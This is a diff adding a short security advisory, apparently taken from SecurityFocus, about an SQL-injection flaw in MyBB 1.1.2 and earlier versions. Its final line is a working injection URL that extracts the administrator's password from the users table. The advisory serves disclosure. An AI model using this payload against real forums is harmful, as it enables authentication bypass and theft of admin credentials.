@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/16443/info
+
+MyBB is prone to an SQL-injection vulnerability.
+
+The vulnerability presents itself when user-supplied input via cookie data is passed to the 'index.php' script.
+
+Successful exploitation can allow an attacker to bypass authentication and gain administrative access to a site. Other attacks may also be possible.
+
+MyBB 1.1.2 and prior versions are reported vulnerable to this issue. 
+
+http://www.example.com/index.php?referrer=9999999999'%20UNION%20SELECT%20password,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,
+9,0,1,2,3,4,5,6,7,8,9%20FROM%20mybb_users%20WHERE%20uid=1/* 
